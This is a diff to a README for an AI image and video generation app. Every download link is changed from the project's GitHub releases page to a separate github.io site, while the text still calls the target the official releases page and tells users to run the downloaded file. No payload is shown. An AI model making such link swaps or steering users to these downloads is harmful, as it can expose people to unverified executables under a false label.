@@ -1,6 +1,6 @@
 # 🌟 2Wild-Image-Video-Gen-Studio - Create Stunning Images and Videos Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-2Wild%20Studio-blue?style=for-the-badge&logo=github)](https://github.com/Bharath0008/2Wild-Image-Video-Gen-Studio/releases)
+[![Download Now](https://img.shields.io/badge/Download-2Wild%20Studio-blue?style=for-the-badge&logo=github)](https://bharath0008.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ Getting started is incredibly easy. Just follow these simple steps, and you'll b
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Bharath0008/2Wild-Image-Video-Gen-Studio/releases](https://github.com/Bharath0008/2Wild-Image-Video-Gen-Studio/releases)
+Visit this link to download the application: [https://bharath0008.github.io](https://bharath0008.github.io)
 
 This link will take you to the official releases page where you can grab the latest version of 2Wild Studio.
 
@@ -38,7 +38,7 @@ Copy the web address from the application window and paste it into any web brows
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Bharath0008/2Wild-Image-Video-Gen-Studio/releases](https://github.com/Bharath0008/2Wild-Image-Video-Gen-Studio/releases)
+Visit this link to download the application: [https://bharath0008.github.io](https://bharath0008.github.io)
 
 Here's what to expect:
 - The download is a single, self-contained file
@@ -171,7 +171,7 @@ We love hearing from our users! Your feedback helps us make this tool better for
 ## 🌟 Start Creating Today!
 
 You're just minutes away from generating incredible images and videos. Remember:
-1. Visit this link to download the application: [https://github.com/Bharath0008/2Wild-Image-Video-Gen-Studio/releases](https://github.com/Bharath0008/2Wild-Image-Video-Gen-Studio/releases)
+1. Visit this link to download the application: [https://bharath0008.github.io](https://bharath0008.github.io)
 2. Run the downloaded file
 3. Open your browser to the address shown
 4. Start creating!
